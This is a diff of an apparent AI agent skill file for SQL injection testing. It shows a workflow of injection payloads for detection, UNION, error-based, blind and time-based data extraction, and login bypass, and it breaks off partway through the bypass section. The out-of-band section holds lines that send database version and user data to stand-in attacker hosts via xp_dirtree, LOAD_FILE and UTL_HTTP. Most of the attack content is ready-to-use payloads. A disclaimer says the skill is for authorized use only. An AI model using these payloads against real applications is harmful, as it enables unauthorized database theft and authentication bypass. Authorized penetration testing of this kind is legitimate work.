@@ -1,210 +1,212 @@
-     1|---
-     2|name: ag-sql-injection-testing
-     3|description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techni"
-     4|version: 1.0.0
-     5|tags: [antigravity, security]
-     6|category: software-development
-     7|source: https://github.com/sickn33/antigravity-awesome-skills
-     8|---
-     9|
-    10|---
-    11|name: sql-injection-testing
-    12|description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
-    13|risk: offensive
-    14|source: community
-    15|author: zebbern
-    16|date_added: "2026-02-27"
-    17|---
-    18|
-    19|> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
-    20|
-    21|# SQL Injection Testing
-    22|
-    23|## Purpose
-    24|
-    25|Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.
-    26|
-    27|## Inputs / Prerequisites
-    28|
-    29|### Required Access
-    30|- Target web application URL with injectable parameters
-    31|- Burp Suite or equivalent proxy tool for request manipulation
-    32|- SQLMap installation for automated exploitation
-    33|- Browser with developer tools enabled
-    34|
-    35|### Technical Requirements
-    36|- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
-    37|- Knowledge of HTTP request/response cycle
-    38|- Familiarity with database schemas and structures
-    39|- Write permissions for testing reports
-    40|
-    41|### Legal Prerequisites
-    42|- Written authorization for penetration testing
-    43|- Defined scope including target URLs and parameters
-    44|- Emergency contact procedures established
-    45|- Data handling agreements in place
-    46|
-    47|## Outputs / Deliverables
-    48|
-    49|### Primary Outputs
-    50|- SQL injection vulnerability report with severity ratings
-    51|- Extracted database schemas and table structures
-    52|- Authentication bypass proof-of-concept demonstrations
-    53|- Remediation recommendations with code examples
-    54|
-    55|### Evidence Artifacts
-    56|- Screenshots of successful injections
-    57|- HTTP request/response logs
-    58|- Database dumps (sanitized)
-    59|- Payload documentation
-    60|
-    61|## Core Workflow
-    62|
-    63|### Phase 1: Detection and Reconnaissance
-    64|
-    65|#### Identify Injectable Parameters
-    66|Locate user-controlled input fields that interact with database queries:
-    67|
-    68|```
-    69|# Common injection points
-    70|- URL parameters: ?id=1, ?user=admin, ?category=books
-    71|- Form fields: username, password, search, comments
-    72|- Cookie values: session_id, user_preference
-    73|- HTTP headers: User-Agent, Referer, X-Forwarded-For
-    74|```
-    75|
-    76|#### Test for Basic Vulnerability Indicators
-    77|Insert special characters to trigger error responses:
-    78|
-    79|```sql
-    80|-- Single quote test
-    81|'
-    82|
-    83|-- Double quote test
-    84|"
-    85|
-    86|-- Comment sequences
-    87|--
-    88|#
-    89|/**/
-    90|
-    91|-- Semicolon for query stacking
-    92|;
-    93|
-    94|-- Parentheses
-    95|)
-    96|```
-    97|
-    98|Monitor application responses for:
-    99|- Database error messages revealing query structure
-   100|- Unexpected application behavior changes
-   101|- HTTP 500 Internal Server errors
-   102|- Modified response content or length
-   103|
-   104|#### Logic Testing Payloads
-   105|Verify boolean-based vulnerability presence:
-   106|
-   107|```sql
-   108|-- True condition tests
-   109|page.asp?id=1 or 1=1
-   110|page.asp?id=1' or 1=1--
-   111|page.asp?id=1" or 1=1--
-   112|
-   113|-- False condition tests  
-   114|page.asp?id=1 and 1=2
-   115|page.asp?id=1' and 1=2--
-   116|```
-   117|
-   118|Compare responses between true and false conditions to confirm injection capability.
-   119|
-   120|### Phase 2: Exploitation Techniques
-   121|
-   122|#### UNION-Based Extraction
-   123|Combine attacker-controlled SELECT statements with original query:
-   124|
-   125|```sql
-   126|-- Determine column count
-   127|ORDER BY 1--
-   128|ORDER BY 2--
-   129|ORDER BY 3--
-   130|-- Continue until error occurs
-   131|
-   132|-- Find displayable columns
-   133|UNION SELECT NULL,NULL,NULL--
-   134|UNION SELECT 'a',NULL,NULL--
-   135|UNION SELECT NULL,'a',NULL--
-   136|
-   137|-- Extract data
-   138|UNION SELECT username,password,NULL FROM users--
-   139|UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
-   140|UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
-   141|```
-   142|
-   143|#### Error-Based Extraction
-   144|Force database errors that leak information:
-   145|
-   146|```sql
-   147|-- MSSQL version extraction
-   148|1' AND 1=CONVERT(int,(SELECT @@version))--
-   149|
-   150|-- MySQL extraction via XPATH
-   151|1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
-   152|
-   153|-- PostgreSQL cast errors
-   154|1' AND 1=CAST((SELECT version()) AS int)--
-   155|```
-   156|
-   157|#### Blind Boolean-Based Extraction
-   158|Infer data through application behavior changes:
-   159|
-   160|```sql
-   161|-- Character extraction
-   162|1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
-   163|1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
-   164|
-   165|-- Conditional responses
-   166|1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
-   167|```
-   168|
-   169|#### Time-Based Blind Extraction
-   170|Use database sleep functions for confirmation:
-   171|
-   172|```sql
-   173|-- MySQL
-   174|1' AND IF(1=1,SLEEP(5),0)--
-   175|1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
-   176|
-   177|-- MSSQL
-   178|1'; WAITFOR DELAY '0:0:5'--
-   179|
-   180|-- PostgreSQL
-   181|1'; SELECT pg_sleep(5)--
-   182|```
-   183|
-   184|#### Out-of-Band (OOB) Extraction
-   185|Exfiltrate data through external channels:
-   186|
-   187|```sql
-   188|-- MSSQL DNS exfiltration
-   189|1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
-   190|
-   191|-- MySQL DNS exfiltration
-   192|1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
-   193|
-   194|-- Oracle HTTP request
-   195|1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
-   196|```
-   197|
-   198|### Phase 3: Authentication Bypass
-   199|
-   200|#### Login Form Exploitation
-   201|Craft payloads to bypass credential verification:
-   202|
-   203|```sql
-   204|-- Classic bypass
-   205|admin'--
-   206|admin'/*
-   207|' OR '1'='1
-   208|' OR '1'='1'--
-   209|' OR '1'='1'/*
-   210|
+---
+name: ag-sql-injection-testing
+description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techni"
+version: 1.0.0
+tags: [antigravity, security]
+category: software-development
+source: https://github.com/sickn33/antigravity-awesome-skills
+---
+
+---
+name: sql-injection-testing
+description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
+risk: offensive
+source: community
+author: zebbern
+date_added: "2026-02-27"
+metadata:
+  hermes:
+    molin_owner: 墨盾（安全/QA）
+---
+
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+
+# SQL Injection Testing
+
+## Purpose
+
+Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.
+
+## Inputs / Prerequisites
+
+### Required Access
+- Target web application URL with injectable parameters
+- Burp Suite or equivalent proxy tool for request manipulation
+- SQLMap installation for automated exploitation
+- Browser with developer tools enabled
+
+### Technical Requirements
+- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
+- Knowledge of HTTP request/response cycle
+- Familiarity with database schemas and structures
+- Write permissions for testing reports
+
+### Legal Prerequisites
+- Written authorization for penetration testing
+- Defined scope including target URLs and parameters
+- Emergency contact procedures established
+- Data handling agreements in place
+
+## Outputs / Deliverables
+
+### Primary Outputs
+- SQL injection vulnerability report with severity ratings
+- Extracted database schemas and table structures
+- Authentication bypass proof-of-concept demonstrations
+- Remediation recommendations with code examples
+
+### Evidence Artifacts
+- Screenshots of successful injections
+- HTTP request/response logs
+- Database dumps (sanitized)
+- Payload documentation
+
+## Core Workflow
+
+### Phase 1: Detection and Reconnaissance
+
+#### Identify Injectable Parameters
+Locate user-controlled input fields that interact with database queries:
+
+```
+# Common injection points
+- URL parameters: ?id=1, ?user=admin, ?category=books
+- Form fields: username, password, search, comments
+- Cookie values: session_id, user_preference
+- HTTP headers: User-Agent, Referer, X-Forwarded-For
+```
+
+#### Test for Basic Vulnerability Indicators
+Insert special characters to trigger error responses:
+
+```sql
+-- Single quote test
+'
+
+-- Double quote test
+"
+
+-- Comment sequences
+--
+#
+/**/
+
+-- Semicolon for query stacking
+;
+
+-- Parentheses
+)
+```
+
+Monitor application responses for:
+- Database error messages revealing query structure
+- Unexpected application behavior changes
+- HTTP 500 Internal Server errors
+- Modified response content or length
+
+#### Logic Testing Payloads
+Verify boolean-based vulnerability presence:
+
+```sql
+-- True condition tests
+page.asp?id=1 or 1=1
+page.asp?id=1' or 1=1--
+page.asp?id=1" or 1=1--
+
+-- False condition tests  
+page.asp?id=1 and 1=2
+page.asp?id=1' and 1=2--
+```
+
+Compare responses between true and false conditions to confirm injection capability.
+
+### Phase 2: Exploitation Techniques
+
+#### UNION-Based Extraction
+Combine attacker-controlled SELECT statements with original query:
+
+```sql
+-- Determine column count
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+-- Continue until error occurs
+
+-- Find displayable columns
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT 'a',NULL,NULL--
+UNION SELECT NULL,'a',NULL--
+
+-- Extract data
+UNION SELECT username,password,NULL FROM users--
+UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+```
+
+#### Error-Based Extraction
+Force database errors that leak information:
+
+```sql
+-- MSSQL version extraction
+1' AND 1=CONVERT(int,(SELECT @@version))--
+
+-- MySQL extraction via XPATH
+1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
+
+-- PostgreSQL cast errors
+1' AND 1=CAST((SELECT version()) AS int)--
+```
+
+#### Blind Boolean-Based Extraction
+Infer data through application behavior changes:
+
+```sql
+-- Character extraction
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
+
+-- Conditional responses
+1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+```
+
+#### Time-Based Blind Extraction
+Use database sleep functions for confirmation:
+
+```sql
+-- MySQL
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
+
+-- MSSQL
+1'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+1'; SELECT pg_sleep(5)--
+```
+
+#### Out-of-Band (OOB) Extraction
+Exfiltrate data through external channels:
+
+```sql
+-- MSSQL DNS exfiltration
+1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
+
+-- MySQL DNS exfiltration
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
+
+-- Oracle HTTP request
+1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+```
+
+### Phase 3: Authentication Bypass
+
+#### Login Form Exploitation
+Craft payloads to bypass credential verification:
+
+```sql
+-- Classic bypass
+admin'--
+admin'/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
